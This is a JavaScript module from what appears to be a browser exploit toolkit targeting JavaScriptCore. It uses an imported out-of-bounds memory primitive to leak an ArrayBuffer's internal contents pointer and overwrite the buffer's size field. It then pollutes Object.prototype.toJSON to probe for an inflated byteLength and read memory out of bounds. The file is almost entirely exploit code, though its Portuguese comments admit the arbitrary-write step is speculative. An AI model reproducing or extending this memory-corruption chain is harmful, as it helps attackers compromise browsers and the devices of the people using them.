// js/script3/testCorruptArrayBufferContents.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
export function toJSON_AttemptWriteToThis() { // Exportada para ser usada por outros módulos se necessário
    const original_victim_ab_size = 64; // Usado como fallback se o 'this' não for o oob_array_buffer_real
    let initial_buffer_size_for_oob_check = original_victim_ab_size;

    if (oob_array_buffer_real && this === oob_array_buffer_real) {
        // Se 'this' é o nosso oob_array_buffer_real principal, usamos seu tamanho original conhecido
        initial_buffer_size_for_oob_check = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
    }


    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis_v3", // Versionada para clareza
        this_type: "N/A",
        this_byteLength_prop: "N/A", 
        dataview_created: false,
        internal_write_val: null, 
        internal_read_val: null,  
        internal_rw_match: false, 
        error_in_toJSON: null,
        oob_read_offset_attempted: "N/A",
        oob_read_value_attempted: "N/A"
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        
        try {
            result_payload.this_byteLength_prop = this.byteLength;
        } catch (e_bl) {
            result_payload.this_byteLength_prop = `Error accessing byteLength: ${e_bl.name}`;
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `ByteLength Access Error: ${e_bl.message}; `;
        }

        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = result_payload.this_byteLength_prop;
            if (typeof current_this_byteLength !== 'number') {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Cannot proceed, this.byteLength is not a number (val: ${current_this_byteLength}).`;
                return result_payload;
            }

            if (current_this_byteLength >= 4) {
                try {
                    let dv_internal = new DataView(this, 0, Math.min(current_this_byteLength, 8));
                    result_payload.dataview_created = true; 
                    
                    const val_to_write_internal = 0xABABABAB;
                    dv_internal.setUint32(0, val_to_write_internal, true); 
                    result_payload.internal_write_val = toHex(val_to_write_internal);
                    
                    let read_back_internal = dv_internal.getUint32(0, true);
                    result_payload.internal_read_val = toHex(read_back_internal);
                    
                    if (read_back_internal === val_to_write_internal) {
                        result_payload.internal_rw_match = true;
                    }
                } catch (e_dv_internal) {
                    result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DataView RW Error: ${e_dv_internal.name} - ${e_dv_internal.message}; `;
                }
            } else {
                 result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (ArrayBuffer) too small for internal RW test (size: ${current_this_byteLength}).`;
            }

            // Tentativa de Leitura OOB se o byteLength for MAIOR que o esperado
            if (current_this_byteLength > initial_buffer_size_for_oob_check) {
                result_payload.oob_read_offset_attempted = toHex(initial_buffer_size_for_oob_check + 8); 
                try {
                    let dv_oob = new DataView(this); 
                    const read_at = initial_buffer_size_for_oob_check + 8;
                    if (dv_oob.byteLength >= (read_at + 4)) { 
                        result_payload.oob_read_value_attempted = toHex(dv_oob.getUint32(read_at, true));
                    } else {
                        result_payload.oob_read_value_attempted = `DataView (size ${dv_oob.byteLength}) too small for OOB read at offset ${toHex(read_at)}.`;
                    }
                } catch (e_oob_r) {
                     result_payload.oob_read_value_attempted = `OOB Read Error @${result_payload.oob_read_offset_attempted}: ${e_oob_r.name}`;
                }
            } else {
                 result_payload.oob_read_offset_attempted = toHex(initial_buffer_size_for_oob_check + 8);
                 result_payload.oob_read_value_attempted = `Size not inflated (this: ${current_this_byteLength}b vs initial: ${initial_buffer_size_for_oob_check}b), OOB read not applicable.`;
            }

        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}; `;
        if (typeof result_payload.this_byteLength_prop === 'string' && result_payload.this_byteLength_prop.startsWith("Error accessing")) {
        } else {
            result_payload.this_byteLength_prop = `Error during toJSON execution: ${e_main.message}`;
        }
    }
    return result_payload;
}


export async function executeCorruptArrayBufferContentsSizeTest() {
    const FNAME_TEST = "executeCorruptABContentsSizeTest";
    logS3(`--- Iniciando Teste: Corromper Tamanho em ArrayBufferContents ---`, "test", FNAME_TEST);
    document.title = `Corrupt ABContents Size Test`;

    const contentsImplPtrOffset = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16);
    const sizeInContentsOffset = parseInt(JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET, 16);

    if (isNaN(contentsImplPtrOffset) || isNaN(sizeInContentsOffset)) {
        logS3("ERRO: Offsets críticos não definidos ou inválidos em config.mjs (CONTENTS_IMPL_POINTER_OFFSET ou ArrayBufferContents.SIZE_IN_BYTES_OFFSET).", "error", FNAME_TEST);
        return { errorOccurred: new Error("Config offsets missing/invalid"), stringifyResult: null, potentiallyCrashed: false };
    }

    logS3(`   Usando CONTENTS_IMPL_POINTER_OFFSET: ${toHex(contentsImplPtrOffset)} (de config.mjs)`, "info", FNAME_TEST);
    logS3(`   Usando ArrayBufferContents.SIZE_IN_BYTES_OFFSET: ${toHex(sizeInContentsOffset)} (de config.mjs)`, "info", FNAME_TEST);

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { errorOccurred: new Error("OOB Setup Failed"), stringifyResult: null, potentiallyCrashed: false };
    }

    const initial_oob_ab_real_byteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initial_oob_ab_real_byteLength} bytes`, "info", FNAME_TEST);

    let contents_impl_ptr_val = null;
    let target_size_field_address_obj = null;
    const new_corrupted_size = 0x7FFFFFFF;
    let corruption_step_error = null;
    let stringifyResult = null;
    let errorOccurred = null;
    let potentiallyCrashed = true;

    try {
        logS3(`1. Lendo ponteiro m_impl de oob_array_buffer_real @ offset ${toHex(contentsImplPtrOffset)}...`, "info", FNAME_TEST);
        contents_impl_ptr_val = oob_read_absolute(contentsImplPtrOffset, 8); 

        if (!isAdvancedInt64Object(contents_impl_ptr_val) || (contents_impl_ptr_val.low() === 0 && contents_impl_ptr_val.high() === 0)) {
            throw new Error(`Ponteiro m_impl lido é inválido ou nulo: ${contents_impl_ptr_val ? contents_impl_ptr_val.toString(true) : 'null'}`);
        }
        logS3(`   Ponteiro m_impl (ArrayBufferContents*) lido: ${contents_impl_ptr_val.toString(true)}`, "leak", FNAME_TEST);

        target_size_field_address_obj = contents_impl_ptr_val.add(new AdvancedInt64(sizeInContentsOffset));
        logS3(`2. Endereço calculado do campo de tamanho (m_impl + ${toHex(sizeInContentsOffset)}): ${target_size_field_address_obj.toString(true)}`, "info", FNAME_TEST);
        
        // IMPORTANTE: Esta é a parte mais especulativa e perigosa.
        // A primitiva oob_write_absolute precisa ser capaz de escrever em um endereço absoluto do HEAP.
        // Se oob_write_absolute é relativa ao oob_array_buffer_real, este teste como está NÃO vai funcionar
        // para corromper ArrayBufferContents se ele estiver fora do oob_array_buffer_real.
        // Assumindo, por um momento, que oob_write_absolute PODE escrever em endereços arbitrários (improvável sem mais primitivas).
        // Se não, a linha abaixo provavelmente causará um erro ou não terá efeito.
        logS3(`3. Escrevendo novo tamanho ${toHex(new_corrupted_size)} em ${target_size_field_address_obj.toString(true)}... (REQUER ESCRITA ABSOLUTA REAL)`, "warn", FNAME_TEST);
        
        // Tentativa de escrita - isso é altamente dependente da natureza da sua primitiva oob_write_absolute
        // Se oob_write_absolute é relativa, e target_size_field_address_obj é um endereço de heap, isso não funcionará.
        // Se target_size_field_address_obj por acaso cair dentro de oob_array_buffer_real E o high for 0, então pode ter algum efeito.
        if (target_size_field_address_obj.high() === 0 && target_size_field_address_obj.low() < oob_array_buffer_real.byteLength) {
             logS3(`   Endereço calculado ${target_size_field_address_obj.toString(true)} é um offset baixo. Tentando escrita relativa...`, "info", FNAME_TEST);
             oob_write_absolute(target_size_field_address_obj.low(), new_corrupted_size, 4);
        } else {
             logS3(`   AVISO: Endereço do campo de tamanho (${target_size_field_address_obj.toString(true)}) é provavelmente um ponteiro de heap alto. A escrita oob_write_absolute relativa não o atingirá. O teste prossegue, mas a corrupção de ArrayBufferContents pode não ocorrer.`, "warn", FNAME_TEST);
             // Não podemos escrever aqui com a primitiva atual se for um endereço de heap real e oob_write_absolute for relativa.
             // Vamos simular um erro para pular o stringify e evitar falsos negativos de "não inflado".
             corruption_step_error = new Error("Não é possível escrever em endereço de heap absoluto com oob_write_absolute relativa.");
        }
        logS3(`   Escrita OOB (tentativa) de novo tamanho realizada.`, "info", FNAME_TEST);

    } catch (e) {
        logS3(`Erro durante as etapas de leitura/cálculo/escrita da corrupção: ${e.message}`, "error", FNAME_TEST);
        corruption_step_error = e;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    if (!corruption_step_error) {
        const ppKey_val = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        let pollutionApplied = false;
        try {
            logS3(`4. Poluindo Object.prototype.toJSON com função de sondagem...`, "info", FNAME_TEST);
            Object.defineProperty(Object.prototype, ppKey_val, {
                value: toJSON_AttemptWriteToThis,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`   PP aplicada.`, "good", FNAME_TEST);

            logS3(`5. Chamando JSON.stringify no oob_array_buffer_real (potencialmente corrompido)...`, "info", FNAME_TEST);
            document.title = `Stringify oob_ab_contents_corrupt`;
            stringifyResult = JSON.stringify(oob_array_buffer_real);
            potentiallyCrashed = false;
            logS3(`   Resultado JSON.stringify: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);

        } catch (e_stringify) {
            logS3(`ERRO CAPTURADO JSON.stringify: ${e_stringify.name} - ${e_stringify.message}.`, "critical", FNAME_TEST);
            errorOccurred = e_stringify;
            potentiallyCrashed = false;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                else delete Object.prototype[ppKey_val];
            }
        }
    } else {
         errorOccurred = corruption_step_error; // Propaga o erro da etapa de corrupção
         potentiallyCrashed = false; // Não crashou no stringify porque não chegamos lá
    }
    
    // Análise final
    if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
        logS3(`   Resultado da Sondagem via toJSON:`, "leak", FNAME_TEST);
        logS3(`     this_byteLength_prop: ${stringifyResult.this_byteLength_prop}`, "leak", FNAME_TEST);
        logS3(`     oob_read_attempt_val: ${stringifyResult.oob_read_value_attempted}`, "leak", FNAME_TEST);
        if (stringifyResult.error_in_toJSON) {
            logS3(`     ERRO DENTRO da toJSON: ${stringifyResult.error_in_toJSON}`, "warn", FNAME_TEST);
        }

        if (typeof stringifyResult.this_byteLength_prop === 'number' && stringifyResult.this_byteLength_prop === new_corrupted_size) {
            logS3(`   !!!! SUCESSO !!!! oob_array_buffer_real.byteLength foi inflado para ${toHex(new_corrupted_size)}!`, "critical", FNAME_TEST);
            document.title = `SUCCESS: ABContents Size Inflated!`;
            if (stringifyResult.oob_read_value_attempted && !String(stringifyResult.oob_read_value_attempted).startsWith("Error") && !String(stringifyResult.oob_read_value_attempted).includes("Too small") && !String(stringifyResult.oob_read_value_attempted).includes("not applicable")) {
                 logS3(`   !!!! LEITURA OOB EM oob_array_buffer_real BEM-SUCEDIDA !!!! Valor: ${stringifyResult.oob_read_value_attempted}`, "critical", FNAME_TEST);
            }
        } else if (typeof stringifyResult.this_byteLength_prop === 'number') {
            logS3(`   Falha: Tamanho percebido (${stringifyResult.this_byteLength_prop}) diferente do esperado (${new_corrupted_size}). Tamanho original: ${initial_oob_ab_real_byteLength}`, "warn", FNAME_TEST);
        }
    } else if (errorOccurred) {
        logS3(`   Teste concluído com erro: ${errorOccurred.message}`, "error", FNAME_TEST);
    } else if (potentiallyCrashed && !corruption_step_error) { // Só considera crash se não houve erro antes
        logS3(`   O TESTE PODE TER CONGELADO ANTES DA SONDAGEM toJSON.`, "error", FNAME_TEST);
    }


    logS3(`--- Teste Corromper Tamanho em ArrayBufferContents CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    return { errorOccurred, stringifyResult, potentiallyCrashed };
}
